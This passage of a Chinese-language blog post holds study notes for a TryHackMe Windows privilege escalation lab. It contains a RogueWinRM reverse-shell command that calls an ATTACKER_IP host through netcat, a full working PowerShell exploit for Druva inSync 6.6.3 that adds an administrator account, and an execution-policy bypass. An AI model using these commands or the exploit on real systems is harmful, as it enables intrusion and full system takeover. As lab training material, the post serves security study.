<pre><code class="hljs scss">c:\tools\RogueWinRM\RogueWinRM.exe -p <span class="hljs-string">"C:\tools\nc64.exe"</span> -a <span class="hljs-string">"-e cmd.exe ATTACKER_IP 4442"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104909061.png" alt="image-20240206104909061"></p>
<p>注意：该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。</p>
<p><code>-p</code> 参数指定漏洞利用程序运行的可执行文件，在本例中为 <code>nc64.exe</code> 。 <code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者机器建立反向 shell，因此传递给 netcat 的参数将为 <code>-e cmd.exe ATTACKER_IP 4442</code> 。</p>
<p>如果一切设置正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4442</span>
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4442</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">49755</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">c</span>:\windows\system32\inetsrv&gt;whoami
nt authority\system</code></pre>
<h2 id="410-未打补丁的软件">4.10 未打补丁的软件</h2>
<p>目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）：</p>
<pre><code class="hljs shell-session">wmic product get name,version,vendor</code></pre>
<p>Remember that the <code>wmic product</code> command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.<br>
请记住， <code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。</p>
<p>一旦我们收集了产品版本信息，我们就可以随时在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>, <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a> 和 <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a>,等网站上在线搜索已安装软件的现有漏洞。</p>
<h3 id="exampledruva-insync-663">Example：Druva inSync 6.6.3</h3>
<p>目标服务器正在运行 Druva inSync 6.6.3，据 Matteo Malvica 报告，该服务器容易受到权限升级的影响。该漏洞是由于对 Chris Lyne 最初针对 6.5.0 版本报告的另一个漏洞应用了错误补丁而导致的。</p>
<p>该软件容易受到攻击，因为它以系统权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。</p>
<p>对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串 <code>C:\ProgramData\Druva\inSync4\</code> 开头，这是允许的二进制文件应该在的地方。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C:\Windows\System32\cmd.exe</code> ，它不在允许的路径中；您只需要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> 即可成功绕过检查。</p>
<p>为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105050216.png" alt="image-20240206105050216"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica 在此发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码：</p>
<pre><code class="hljs scss"><span class="hljs-variable">$ErrorActionPreference</span> = "Stop"

<span class="hljs-variable">$cmd</span> = "net user pwnd /add"

<span class="hljs-variable">$s</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.Socket</span>(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
<span class="hljs-variable">$s</span><span class="hljs-selector-class">.Connect</span>("<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>", <span class="hljs-number">6064</span>)

<span class="hljs-variable">$header</span> = <span class="hljs-selector-attr">[System.Text.Encoding]</span>::UTF8.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">"inSync PHC RPCW[v0002]"</span>)
<span class="hljs-variable">$rpcType</span> = [System.Text.Encoding]::UTF8.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">"$([char]0x0005)`0`0`0"</span>)
<span class="hljs-variable">$command</span> = [System.Text.Encoding]::Unicode.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">"C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"</span>);
<span class="hljs-variable">$length</span> = <span class="hljs-selector-attr">[System.BitConverter]</span>::<span class="hljs-built_in">GetBytes</span>(<span class="hljs-variable">$command</span>.Length);

<span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($header)
<span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($rpcType)
<span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($length)
<span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($command)</code></pre>
<p>您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它（该漏洞也可以在目标计算机中的 <code>C:\tools\Druva_inSync_exploit.txt</code> 中找到）。请注意，在 <code>$cmd</code> 变量中指定的漏洞利用的默认负载将在系统中创建一个名为 <code>pwnd</code> 的用户，但不会为其分配管理权限，因此我们可能想要更改有效负载以获得更有用的东西。对于这个房间，我们将更改有效负载以运行以下命令：</p>
<pre><code class="hljs scss">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</code></pre>
<p>这将创建密码为 <code>SimplePass123</code> 的用户 <code>pwnd</code> 并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户 <code>pwnd</code> 是否存在并且属于管理员组：</p>
<p>Command Prompt 命令提示符</p>
<pre><code class="hljs scss">PS C:\&gt; net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None</code></pre>
<p>最后一步，您可以以管理员身份运行命令提示符：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105125538.png" alt="image-20240206105125538"></p>
<h1 id="0x05-自动化工具">0x05 自动化工具</h1>
<p>有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。</p>
<p>以下是一些常用于识别权限升级向量的工具。请随意针对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
<h2 id="51-winpeas">5.1 WinPEAS</h2>
<p>WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。 WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS 的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示：</p>
<pre><code class="hljs scss">C:\&gt; winpeas.exe &gt; outputfile.txt</code></pre>
<p>WinPEAS 可在此处下载：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">here</a></p>
<h2 id="52-privesccheck">5.2 PrivescCheck</h2>
<p>PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
<p>PrivescCheck 可在此处下载 <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">here</a>.</p>
<p>提醒：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p>
<pre><code class="hljs scss">PS C:\&gt; Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\&gt; . .\PrivescCheck.ps1
PS C:\&gt; Invoke-PrivescCheck</code></pre>
<h2 id="53-wes-ng">5.3 WES-NG</h2>
<p>一些漏洞利用建议脚本（例如 winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
<p>WES-NG 是一个 Python 脚本，可以在此处找到并下载。 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">here</a>.</p>
<p>安装后，在使用之前，请键入 <code>wes.py --update</code> 命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。</p>
<p>完成后，<a target="_blank" rel="noopener" href="http://wes.py">wes.py</a> 可以按如下方式运行；</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@kali</span>$ wes.py systeminfo.txt</code></pre>
<h2 id="54-metasploit-元分析软件">5.4 Metasploit 元分析软件</h2>
<p>如果目标系统上已有 Meterpreter shell，则可以使用 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/')">THM-Windows权限提升</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Windows权限提升&amp;url=http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常规漏洞学习总结</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/06/thm-windows-ben-di-chi-jiu-xing/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-Windows本地持久性</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/16/thm-hacking-with-powershell/" title="THM-Hacking_With_PowerShell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-16</div><div class="title">THM-Hacking_With_PowerShell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">0x02 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-windows%E7%94%A8%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">0x03 Windows用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-windows%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">0x03 Windows密码收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#31-windows-installations"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 Windows installations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-powershell-history"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 Powershell History</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-windows-credentials"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 Windows Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-iis-configuration"><span class="toc-number">4.4.</span> <span class="toc-text">3.4 IIS Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E4%BB%8E%E8%BD%AF%E4%BB%B6%E6%A3%80%E7%B4%A2%E5%87%AD%E8%AF%81putty"><span class="toc-number">4.5.</span> <span class="toc-text">3.5 从软件检索凭证：PuTTY</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">0x04 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-scheduled-tasks-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 Scheduled Tasks -计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-alwaysinstallelevated-%E5%A7%8B%E7%BB%88%E5%AE%89%E8%A3%85%E6%8F%90%E5%8D%87"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 AlwaysInstallElevated -始终安装提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-windows-services"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 Windows Services</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 服务可执行文件的不安全权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E6%9C%AA%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">5.5.</span> <span class="toc-text">4.5 未加引号的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">5.6.</span> <span class="toc-text">4.6 不安全的服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">5.6.1.</span> <span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-sebackup-serestore"><span class="toc-number">5.7.</span> <span class="toc-text">4.7 SeBackup &#x2F; SeRestore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-setakeownership"><span class="toc-number">5.8.</span> <span class="toc-text">4.8 SeTakeOwnership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-seimpersonate-seassignprimarytoken"><span class="toc-number">5.9.</span> <span class="toc-text">4.9 SeImpersonate &#x2F; SeAssignPrimaryToken</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#410-%E6%9C%AA%E6%89%93%E8%A1%A5%E4%B8%81%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">5.10.</span> <span class="toc-text">4.10 未打补丁的软件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exampledruva-insync-663"><span class="toc-number">5.10.1.</span> <span class="toc-text">Example：Druva inSync 6.6.3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">0x05 自动化工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-winpeas"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 WinPEAS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-privesccheck"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 PrivescCheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-wes-ng"><span class="toc-number">6.3.</span> <span class="toc-text">5.3 WES-NG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-metasploit-%E5%85%83%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.4.</span> <span class="toc-text">5.4 Metasploit 元分析软件</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= 